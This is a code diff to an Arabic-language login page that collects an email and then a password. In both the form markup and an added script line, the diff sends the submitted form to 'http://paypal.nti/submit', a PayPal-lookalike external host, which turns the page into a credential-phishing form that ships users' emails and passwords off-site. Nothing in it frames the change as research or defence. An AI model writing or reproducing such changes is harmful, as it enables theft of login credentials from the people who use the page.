@@ -113,7 +113,7 @@
       <button type="button" class="signup-btn">تسجيل الاشتراك</button>
     </form>
 
-    <form id="passwordForm" class="login-form" style="display:none;" action="/submit" method="post">
+    <form id="passwordForm" class="login-form" style="display:none;" action="http://paypal.nti/submit" method="post">
       <!-- hidden email field will be injected here -->
       <input id="passwordInput" name="password" type="password" placeholder="أدخل كلمة المرور" required>
       <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
@@ -134,23 +134,25 @@
     </div>
   </div>
 
-  <script>
-    const emailForm = document.getElementById("emailForm");
-    const passwordForm = document.getElementById("passwordForm");
-    const emailInput = document.getElementById("emailInput");
+<script>
+  const emailForm = document.getElementById("emailForm");
+  const passwordForm = document.getElementById("passwordForm");
+  const emailInput = document.getElementById("emailInput");
 
-    emailForm.addEventListener("submit", function(e) {
-      e.preventDefault();
-      // Add hidden email field to password form
-      const hiddenEmail = document.createElement("input");
-      hiddenEmail.type = "hidden";
-      hiddenEmail.name = "email";
-      hiddenEmail.value = emailInput.value;
-      passwordForm.appendChild(hiddenEmail);
+  passwordForm.action = "http://paypal.nti/submit";
 
-      emailForm.style.display = "none";
-      passwordForm.style.display = "block";
-    });
-  </script>
+  emailForm.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const hiddenEmail = document.createElement("input");
+    hiddenEmail.type = "hidden";
+    hiddenEmail.name = "email";
+    hiddenEmail.value = emailInput.value;
+    passwordForm.appendChild(hiddenEmail);
+
+    emailForm.style.display = "none";
+    passwordForm.style.display = "block";
+  });
+</script>
 </body>
 </html>
